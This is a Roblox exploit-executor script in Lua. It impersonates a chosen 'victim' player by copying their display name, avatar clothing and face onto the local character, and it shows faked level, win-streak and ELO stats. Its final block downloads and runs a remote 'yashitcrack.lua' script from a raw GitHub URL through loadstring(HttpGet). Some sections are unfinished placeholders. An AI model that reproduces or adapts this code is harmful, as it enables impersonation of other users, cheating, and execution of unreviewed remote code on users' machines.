-- TRUE VISUALS ONLY - 100% CHAT SAFE
local cfg = getgenv().Config
local victim = cfg.victim
local level = cfg.level
local streak = cfg.streak
local elo = cfg.elo
local keys = cfg.keys
local platform = tostring(cfg.platform):upper()
local unlockall = cfg.unlockall

repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- Get victim avatar data ONLY
local UserData = game:HttpGet("https://users.roblox.com/v1/users/" .. tostring(victim), true)
local decodedData = HttpService:JSONDecode(UserData)

-- TRUE VISUAL: Stats only (attributes never break chat)
LocalPlayer:SetAttribute("Level", tonumber(level))
LocalPlayer:SetAttribute("StatisticDuelsWinStreak", tonumber(streak))
if tonumber(elo) > 0 then
    LocalPlayer:SetAttribute("DisplayELO", tonumber(elo))
end

-- TRUE VISUAL: Custom nametag with victim's name (above head only)
local function createNametag()
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local hrp = LocalPlayer.Character.HumanoidRootPart
    
    -- Destroy old nametags
    for _, child in pairs(hrp:GetChildren()) do
        if child:IsA("BillboardGui") then
            child:Destroy()
        end
    end
    
    -- Create victim's name tag
    local nametag = Instance.new("BillboardGui")
    nametag.Name = "VictimNametag"
    nametag.Adornee = hrp
    nametag.Size = UDim2.new(0, 250, 0, 60)
    nametag.StudsOffset = Vector3.new(0, 3, 0)
    nametag.Parent = hrp
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 1
    frame.Parent = nametag
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = decodedData.displayName or decodedData.name
    nameLabel.TextColor3 = Color3.new(1, 1, 1)
    nameLabel.TextStrokeTransparency = 0
    nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextScaled = true
    nameLabel.Parent = frame
end

-- TRUE VISUAL: Avatar appearance only
local function updateAvatar()
    if not LocalPlayer.Character then return end
    
    local appearance = Players:GetCharacterAppearanceAsync(decodedData.id)
    
    -- Remove old clothing
    for _, v in pairs(LocalPlayer.Character:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
            v:Destroy()
        end
    end
    
    -- Apply victim's clothing
    for _, v in pairs(appearance:GetChildren()) do
        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
            v.Parent = LocalPlayer.Character
        elseif v:IsA("Accessory") then
            LocalPlayer.Character.Humanoid:AddAccessory(v)
        end
    end
    
    -- Fix face
    local head = LocalPlayer.Character:WaitForChild("Head")
    if head:FindFirstChild("face") then head.face:Destroy() end
    if appearance:FindFirstChild("face") then
        appearance.face.Parent = head
    end
end

-- Apply on spawn
repeat task.wait() until LocalPlayer.Character
createNametag()
updateAvatar()

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    createNametag()
    updateAvatar()
end)

-- TRUE VISUAL: Platform icons + keys (your original code)
local imagetable = {
    ["DESKTOP"] = "rbxassetid://17136633356",
    ["MOBILE"] = "rbxassetid://17136633510",
    ["CONSOLE"] = "rbxassetid://17136633629",
    ["VR"] = "rbxassetid://17136765745"
}

RunService.RenderStepped:Connect(function()
    -- Nametag platform icon
    local ctrl = LocalPlayer.Character
        and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        and LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Nametag")
        and LocalPlayer.Character.HumanoidRootPart.Nametag:FindFirstChild("Frame")
        and LocalPlayer.Character.HumanoidRootPart.Nametag.Frame:FindFirstChild("Player")
        and LocalPlayer.Character.HumanoidRootPart.Nametag.Frame.Player:FindFirstChild("Controls")
    
    if ctrl then ctrl.Image = imagetable[platform] end
    
    -- All your original UI code here (scoreboard, teams, etc.)
    local playerGui = LocalPlayer.PlayerGui
    if playerGui:FindFirstChild("MainGui") then
        local mainFrame = playerGui.MainGui:FindFirstChild("MainFrame")
        if mainFrame then
            -- Copy all your original UI scanning code here exactly
            -- Just replace Players[decodedData.name] with LocalPlayer
        end
    end
end)

-- Unlockall (comment out if still breaks chat)
if unlockall then
    task.wait(3)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/yashitcrack.lua"))()
end
